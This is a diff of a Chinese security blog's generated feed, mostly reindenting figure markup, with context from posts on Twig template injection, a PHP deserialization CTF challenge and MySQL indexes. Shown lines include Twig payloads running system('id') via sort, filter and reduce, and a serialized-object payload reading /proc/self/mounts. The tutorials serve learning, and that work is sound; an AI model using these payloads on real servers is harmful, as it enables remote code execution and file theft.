@@ -377,11 +377,11 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在Twig 2.x 以及 3.x 的版本中， &lt;code&gt;_self&lt;/code&gt; 的作用发生了变化，只能返回当前实例名的字符串，因此这个payload只能够再1.x版本使用 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;../../../Documents/OrgNotes/OrgImages/Server_Side_Template_Injection_%28SSTI%29_%e6%a8%a1%e6%9d%bf%e6%b3%a8%e5%85%a5%ef%bc%9a%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86/2022-07-01_17-27-09_screenshot.png&#34;
-         alt=&#34;Figure 1: Deprecated Features of Twig 1.x&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;&lt;a class=&#34;link&#34; href=&#34;https://twig.symfony.com/doc/1.x/deprecated.html#globals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;Deprecated Features of Twig 1.x&lt;/a&gt;&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 1: Deprecated Features of Twig 1.x&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 1: &lt;!-- raw HTML omitted --&gt;&lt;a class=&#34;link&#34; href=&#34;https://twig.symfony.com/doc/1.x/deprecated.html#globals&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+        &gt;Deprecated Features of Twig 1.x&lt;/a&gt;&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;同时 &lt;code&gt;getFilter&lt;/code&gt; 方法中也不再包含危险的函数了： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;getFilter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;TwigFilter&lt;/span&gt;
@@ -533,10 +533,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-34-07_screenshot.png&#34;
-         alt=&#34;Figure 2: uasort 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;uasort 函数测试命令行执行&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 2: uasort 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 2: &lt;!-- raw HTML omitted --&gt;uasort 函数测试命令行执行&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;同样可以用来进行远程代码执行，payload如下： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;sort&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -593,10 +593,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/ol&gt;
 &lt;p&gt;也就是说这里$arrow直接可以配合$array进行执行 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-29-52_screenshot.png&#34;
-         alt=&#34;Figure 3: array_filter 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;array_filter 函数测试命令行执行&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 3: array_filter 函数测试命令行执行&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;array_filter 函数测试命令行执行&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;因此也可以payload于之前类似 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;filter&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -626,10 +626,10 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;其中的 &lt;code&gt;array_reduce&lt;/code&gt; 方法同样也也将 $arrow 作为回调函数直接执行，并将 $array 作为参数带入 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-07-01_23-40-14_screenshot.png&#34;
-         alt=&#34;Figure 4: array_reduce 函数测试命令行调用&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;array_reduce 函数测试命令行调用&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+             alt=&#34;Figure 4: array_reduce 函数测试命令行调用&#34; width=&#34;300px&#34;/&gt;&lt;figcaption&gt;
+                &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;array_reduce 函数测试命令行调用&lt;/p&gt;
+            &lt;/figcaption&gt;
+    &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;那么payload同样也是类似的，不过这里要传入的参数需要包含至少两个，这样才符合两个操作值： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{{[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;reduce&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;system&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)}}&lt;/span&gt;
@@ -928,7 +928,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;p&gt;源码内我们标出了三个限制点： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;A, 对GET输入检查是否包含&amp;rsquo;users&amp;rsquo;字符串，我们可以通过修改序列化字符串中的s为S，这样就可以支持利用16进制编码来进行绕过， &lt;code&gt;s:4:&amp;quot;user&amp;quot;; -&amp;gt; S:4:&amp;quot;use\72&amp;quot;;&lt;/code&gt; &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
-&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法适用于PHP 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
+&lt;li&gt;B, 我们在序列化的字符串中对于 &lt;code&gt;MyFile-&amp;gt;name&lt;/code&gt; 会被 &lt;code&gt;__wakeup&lt;/code&gt; 给替换掉，我们可以利用修改属性来绕过 &lt;code&gt;__wakeup&lt;/code&gt; 的替换（此方法只适用于PHP5 &amp;lt; 5.6.25, PHP7 &amp;lt; 7.0.10），这里我们使用浅copy来对可控变量 &lt;code&gt;$this-&amp;gt;user&lt;/code&gt; 来进行过滤 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;li&gt;C, 无法直接获取文件名，可以配合 &lt;code&gt;glob://&lt;/code&gt; 协议来测信道出 flag 的文件名字 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
 &lt;/ul&gt;
 &lt;p&gt;因此我们构造 payload： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
@@ -952,7 +952,7 @@ $loader = new \Twig\Loader\FilesystemLoader([$templateDir1, $templateDir2]); # �
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;var_dump&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; 
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 得到序列化结果:
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\\72&amp;#34;;R:2;}
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// O:6:&amp;#34;MyFile&amp;#34;:2:{s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;use\72&amp;#34;;R:2;}
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// 文件任意读 payload：
 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// input=O:6:&amp;#34;MyFile&amp;#34;:2: {s:4:&amp;#34;name&amp;#34;;s:0:&amp;#34;&amp;#34;;S:4:&amp;#34;us\65r&amp;#34;;R:2;}&amp;amp;user=/proc/self/mounts
@@ -1092,8 +1092,9 @@ O%3A4%3A%22Name%2 &lt;code&gt;3&lt;/code&gt; %3A2%3A%7Bs%3A14%3A%22%00Name%00use
         &lt;/figcaption&gt;
 &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
-&lt;p&gt;参考：[[&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
-    &gt;https://segmentfault.com/a/1190000022534926&lt;/a&gt;][CTF-Web-[极客大挑战 2019]PHP &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;参考： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://segmentfault.com/a/1190000022534926&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;CTF-Web-[极客大挑战 2019]PHP&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -1775,10 +1776,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;li&gt;
 &lt;p&gt;其满足“最左前缀”原则，即使用where时条件要按照建立所以的字段的排列方式设置才能使索引生效 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-28-16_screenshot.png&#34;
-         alt=&#34;Figure 3: 联合索引：将几个列的值组合起来进行索引&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;联合索引：将几个列的值组合起来进行索引&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                         alt=&#34;Figure 3: 联合索引：将几个列的值组合起来进行索引&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 3: &lt;!-- raw HTML omitted --&gt;联合索引：将几个列的值组合起来进行索引&lt;/p&gt;
+                        &lt;/figcaption&gt;
+                &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -1799,10 +1800,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;Clustered Index 聚簇索引&lt;/p&gt;
 &lt;p&gt;其主要特点就是，数据的存储与索引是放在一起的，索引完成之后，数据也随之被找到。 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-17-25_screenshot.png&#34;
-         alt=&#34;Figure 4: B&amp;#43;Tree&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;B+Tree&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                 alt=&#34;Figure 4: B&amp;#43;Tree&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                    &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 4: &lt;!-- raw HTML omitted --&gt;B+Tree&lt;/p&gt;
+                &lt;/figcaption&gt;
+        &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
@@ -1812,10 +1813,10 @@ PREPARE stmt_name FROM preparable_stmt &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;非聚簇索引&lt;/p&gt;
 &lt;p&gt;数据和索引是分开的，其B+Tree叶子结点存放的是真正数据的地址而非数据的内容 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-06-05_22-33-07_screenshot.png&#34;
-         alt=&#34;Figure 5: 辅助索引：数据与索引分开&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
-            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;辅助索引：数据与索引分开&lt;/p&gt;
-        &lt;/figcaption&gt;
-&lt;/figure&gt;
+                 alt=&#34;Figure 5: 辅助索引：数据与索引分开&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
+                    &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 5: &lt;!-- raw HTML omitted --&gt;辅助索引：数据与索引分开&lt;/p&gt;
+                &lt;/figcaption&gt;
+        &lt;/figure&gt;
  &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
 &lt;/li&gt;
 &lt;/ul&gt;
